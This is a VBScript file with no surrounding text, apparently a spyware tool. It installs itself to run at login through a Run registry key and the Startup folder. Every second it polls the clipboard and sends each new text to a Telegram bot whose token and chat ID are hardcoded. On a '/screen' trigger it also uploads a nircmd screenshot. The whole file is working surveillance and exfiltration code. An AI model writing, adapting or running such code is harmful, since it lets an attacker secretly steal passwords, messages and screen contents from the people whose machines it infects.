' Define the path where nircmd.exe should be saved
nircmdPath = "C:\Tools\nircmd.exe" ' Update this with your desired directory path
nircmdURL = "https://www.nirsoft.net/utils/nircmd.zip" ' URL of nircmd.zip (zip version)

' Check if nircmd.exe exists
If Not FileExists(nircmdPath) Then
    ' If not, download and extract nircmd.exe
    DownloadNircmd nircmdURL, "C:\Tools\nircmd.zip" ' Change directory if necessary
    ExtractZip "C:\Tools\nircmd.zip", "C:\Tools\" ' Extract the zip to the directory
End If

' Check if the script is running with administrator privileges
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' If not running as admin, re-run with elevated privileges
If Not IsAdmin() Then
    ' Use the ShellExecute method to run the script as administrator
    objShell.Run "wscript.exe """ & WScript.ScriptFullName & """", 0, True
    WScript.Quit
End If

' Function to check if the script is running as administrator
Function IsAdmin()
    On Error Resume Next
    Dim objShell, objEnv
    Set objShell = CreateObject("WScript.Shell")
    Set objEnv = objShell.Environment("Process")
    
    ' Admin privileges are determined by the ability to access system folders like Program Files
    IsAdmin = (objEnv("ProgramFiles(x86)") <> "")
    On Error GoTo 0
End Function

' Add to startup registry for automatic execution on login
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClipboardMonitor"
strScriptPath = Chr(34) & WScript.ScriptFullName & Chr(34)

On Error Resume Next
If objShell.RegRead(strRegPath) = "" Then
    objShell.RegWrite strRegPath, "wscript.exe //B " & strScriptPath, "REG_SZ"
End If
On Error GoTo 0

' Save a copy of the script in the Startup folder to ensure it starts automatically
strStartupFolder = objShell.SpecialFolders("Startup")
strDestPath = strStartupFolder & "\" & objFSO.GetFileName(WScript.ScriptFullName)
If Not objFSO.FileExists(strDestPath) Then
    objFSO.CopyFile WScript.ScriptFullName, strDestPath
End If

' Telegram Bot details
botToken = "8193387679:AAGG3-UoQqRlTnrcBt7OxUJsB-cPUu8woPc"
chatID = "7055058745"

' Function to send message to Telegram
Function SendTelegramMessage(message)
    On Error Resume Next
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlhttp.Open "GET", "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatID & "&text=" & message, False
    xmlhttp.Send
    If Err.Number <> 0 Then Err.Clear
End Function

' Function to get text from clipboard
Function GetClipboardText()
    On Error Resume Next
    Dim clipboardText
    clipboardText = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
    If clipboardText = "" Then GetClipboardText = "No text found" Else GetClipboardText = clipboardText
    If Err.Number <> 0 Then Err.Clear
End Function

' Function to capture a screenshot and send it to Telegram
Function CaptureAndSendScreenshot()
    ' Run nircmd to capture the screenshot
    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot C:\Tools\screenshot.png", 0, True

    ' Send the screenshot to Telegram
    SendTelegramMessage "Sending screenshot..."
    Call SendPhotoToTelegram("C:\Tools\screenshot.png")
End Function

' Function to send photo to Telegram
Function SendPhotoToTelegram(photoPath)
    On Error Resume Next
    Dim xmlhttp, boundary, body, fileData, fileName
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")

    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & chatID & vbCrLf
    body = body & "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""photo""; filename=""screenshot.png""" & vbCrLf
    body = body & "Content-Type: image/png" & vbCrLf & vbCrLf
    
    ' Open the file data
    Set fileData = CreateObject("ADODB.Stream")
    fileData.Type = 1 ' binary
    fileData.Open
    fileData.LoadFromFile photoPath
    body = body & fileData.Read(fileData.Size) & vbCrLf
    body = body & "--" & boundary & "--" & vbCrLf

    ' Send the request
    xmlhttp.Open "POST", "https://api.telegram.org/bot" & botToken & "/sendPhoto", False
    xmlhttp.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    xmlhttp.Send body
    If Err.Number <> 0 Then Err.Clear
End Function

' Function to check if a file exists
Function FileExists(filePath)
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    FileExists = objFSO.FileExists(filePath)
End Function

' Function to download a file from a URL
Sub DownloadNircmd(url, savePath)
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")
    Set stream = CreateObject("ADODB.Stream")
    
    xmlhttp.Open "GET", url, False
    xmlhttp.Send
    
    ' Save the file to the specified path
    stream.Open
    stream.Type = 1 ' binary
    stream.Write xmlhttp.responseBody
    stream.SaveToFile savePath, 2 ' Overwrite if file exists
    stream.Close
End Sub

' Function to extract a ZIP file using PowerShell (requires PowerShell)
Sub ExtractZip(zipPath, destination)
    Set objShell = CreateObject("WScript.Shell")
    
    ' Run PowerShell to extract the ZIP
    objShell.Run "powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & destination & "'""", 0, True
End Sub

' Main loop to keep script running and monitor clipboard
On Error Resume Next
Do While True
    Dim currentClipboardText, lastClipboardText
    currentClipboardText = GetClipboardText()
    
    If currentClipboardText <> "" And currentClipboardText <> lastClipboardText Then
        lastClipboardText = currentClipboardText
        SendTelegramMessage "New clipboard text: " & currentClipboardText
    End If
    
    ' Check for /screen command to capture and send a screenshot
    If InStr(currentClipboardText, "/screen") > 0 Then
        CaptureAndSendScreenshot()
    End If
    
    WScript.Sleep 1000 ' Check every second
    If Err.Number <> 0 Then Err.Clear
Loop
